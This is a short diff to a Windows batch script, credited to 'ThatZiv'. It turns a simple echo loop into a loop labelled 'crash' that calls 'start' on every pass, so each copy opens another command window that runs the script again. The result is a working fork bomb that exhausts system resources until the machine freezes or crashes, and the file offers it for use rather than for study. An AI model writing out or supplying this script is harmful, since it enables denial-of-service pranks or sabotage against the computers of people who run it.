@@ -1,4 +1,6 @@
+rem Made by ThatZiv 
 @echo off
-:start
-echo bye bye
-goto start
+:crash
+  start
+  echo bye bye
+goto crash
